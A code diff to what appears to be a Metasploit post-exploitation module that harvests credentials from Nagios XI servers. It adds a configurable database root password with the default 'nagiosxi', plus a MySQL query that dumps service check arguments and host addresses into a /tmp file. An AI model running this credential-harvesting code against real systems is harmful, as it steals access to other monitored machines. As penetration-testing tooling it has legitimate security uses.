@@ -19,18 +19,13 @@
             'Benny Husted', # @BennyHusted
             'Jared Arave'   # @iotennui
           ],
-        'DisclosureDate'  => 'Aug 8 2017',
+        'DisclosureDate'  => 'Apr 17 2018',
         'Platform'       => 'linux',
-        'Arch'           => [ARCH_X86, ARCH_X64],
-        'Targets'        =>        [
-            ['Nagios XI 5.2.6 <= 5.4.12', upper_version: Gem::Version.new('5.4.12'), lower_version: Gem::Version.new('5.2.6')]
-        ],
-        'DefaultOptions' => { 'PrependFork' => true, 'WfsDelay' => 10 },
         'SessionTypes'   => ['shell', 'meterpreter'],
-        'DefaultTarget'  => 0
         }
       ))
       register_options([
+        OptString.new('DB_ROOT_PWD', [true, 'Password for DB root user, an option if they change this', 'nagiosxi' ])
       ])
     end
 
@@ -133,7 +128,8 @@
       db_dump_file  = '/tmp/'
       db_dump_file << [*('a'..'z'),*('A'..'Z')].shuffle[0,8].join.to_s
 
-      sql_query  =  %Q|mysql -u root -pnagiosxi -e "|
+      sql_query  =  %Q|mysql -u root -p#{datastore['DB_ROOT_PWD']} -e "|
+      print_good(sql_query)
       sql_query <<  %Q|SELECT nagios_services.check_command_object_id, nagios_hosts.address, REPLACE(nagios_services.check_command_args,'\\"','%22') FROM nagios.nagios_hosts |
       sql_query <<  %Q|INNER JOIN nagios.nagios_services on nagios_hosts.host_object_id=nagios_services.host_object_id |
       sql_query <<  %Q|INNER JOIN nagios.nagios_commands on nagios_commands.object_id = nagios_services.check_command_object_id |
@@ -317,7 +313,7 @@
     end
 
 
-    print_status(%Q|Run 'creds' to see credentials loaded into the MSF DB|)
+    print_status("Run 'creds' to see credentials loaded into the MSF DB")
 
       #cleanup db dump
       register_file_for_cleanup(db_dump_file)
